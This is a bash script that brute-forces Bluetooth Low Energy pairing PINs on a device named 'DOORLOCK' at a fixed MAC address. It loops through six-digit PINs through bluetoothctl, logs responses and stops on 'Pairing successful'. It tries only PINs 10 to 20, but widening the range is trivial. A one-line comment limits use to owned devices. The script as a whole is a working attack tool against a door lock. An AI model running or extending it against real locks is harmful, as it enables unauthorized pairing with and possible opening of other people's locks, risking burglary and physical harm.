#!/usr/bin/env bash
# BLE PIN tester — tries different PINs
# Use only on devices you own/control.

DEVICE_NAME="DOORLOCK"
DEVICE_MAC="34:98:7A:68:FB:FA"
CHAR_PATH="/org/bluez/hci0/dev_34_98_7A_68_FB_FA/service000e/char000f"
SUCCESS_KEYWORD="Pairing successful"
LOGFILE="ble_response.log"

# Restart bluetooth (optional)
echo "Restarting Bluetooth..."
sudo systemctl daemon-reload 2>/dev/null
sudo systemctl restart bluetooth
sleep 2

echo "Powering on adapter..."
bluetoothctl power on >/dev/null

echo "Scanning for BLE devices..."
bluetoothctl --timeout 10 scan on | grep "$DEVICE_NAME"

# Clear log file
: > "$LOGFILE"

# Range to test
for i in {10..20}; do
  PIN=$(printf "%06d" $i)  # Format as 6-digit PIN (000010, 000011, etc.)
  echo "Trying PIN: $PIN"
  
  # Run bluetoothctl commands and capture output
  (
    echo "trust $DEVICE_MAC"
    echo "pair $DEVICE_MAC"
    # wait for pairing request
    sleep 2
    # respond with PIN when prompted
    echo "$PIN"
    echo "connect $DEVICE_MAC"
    # Wait until connected
    sleep 5
    echo "menu gatt"
    echo "list-attributes"
  ) | bluetoothctl 2>&1 | tee -a "$LOGFILE"
  
  # Check if pairing was successful
  if grep -q "$SUCCESS_KEYWORD" "$LOGFILE"; then
    echo "SUCCESS! PIN found: $PIN"
    exit 0
  fi
  
  # Delay between attempts
  sleep 1
done

echo "No successful PIN found in tested range."
exit 1
